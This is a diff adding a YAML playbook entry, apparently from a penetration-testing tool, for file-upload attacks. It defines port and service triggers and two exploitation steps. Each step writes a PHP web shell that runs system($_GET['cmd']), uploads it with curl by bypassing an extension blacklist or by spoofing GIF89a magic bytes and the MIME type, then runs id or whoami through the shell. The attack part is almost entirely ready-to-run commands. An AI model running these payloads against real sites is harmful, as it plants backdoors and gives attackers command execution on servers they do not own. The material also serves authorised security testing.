@@ -1,0 +1,47 @@
+id: file-upload
+name: File Upload Attacks & Filter Bypasses
+category: web
+description: Methodology for exploiting unvalidated file uploads. Covers extension blacklisting bypasses (.phtml, .php5), MIME-type spoofing, magic bytes injection, and polyglot shells.
+port_triggers:
+  - 80
+  - 443
+  - 8000
+  - 8080
+  - 8443
+  - 8978
+service_triggers:
+  - http
+  - https
+  - web
+tags:
+  - upload
+  - webshell
+  - bypasses
+  - web
+steps:
+  - id: upload-phtml-bypass
+    title: Extension Blacklist Bypass (.phtml / .php5)
+    phase: exploitation
+    purpose: Bypass weak file upload extension blacklists using alternate executable extensions (.phtml, .php5, .phar, .inc).
+    command: echo '<?php system($_GET["cmd"]); ?>' > shell.phtml && curl -X POST -F 'file=@shell.phtml' {{TARGET_URL}}/upload.php
+    expected_output:
+      - '{"status":"success","path":"uploads/shell.phtml"}'
+    common_mistakes:
+      - Not checking file upload location in HTTP response or JavaScript upload handler.
+    if_success: 'Web shell uploaded! Test command: `curl "{{TARGET_URL}}/uploads/shell.phtml?cmd=id"`.'
+    if_failure: File rejected. Test MIME-type and Magic Byte spoofing.
+    references:
+      - https://portswigger.net/web-security/file-upload
+  - id: upload-magic-bytes
+    title: Magic Bytes & Content-Type Spoofing (GIF89a)
+    phase: exploitation
+    purpose: Bypass server-side image validation (getimagesize / fileinfo) by prepending GIF89a magic bytes header.
+    command: (echo "GIF89a;"; echo "<?php system(\$_GET['cmd']); ?>") > shell.gif.php && curl -X POST -F "file=@shell.gif.php;type=image/gif" {{TARGET_URL}}/upload.php
+    expected_output:
+      - 'Upload successful: uploads/shell.gif.php'
+    common_mistakes:
+      - Not spoofing both the Content-Type header (`image/gif`) AND magic bytes header in file body.
+    if_success: Magic byte check bypassed! Execute commands via `{{TARGET_URL}}/uploads/shell.gif.php?cmd=whoami`.
+    if_failure: File renamed or image re-encoded. Test .htaccess or .user.ini override.
+    references:
+      - https://portswigger.net/web-security/file-upload
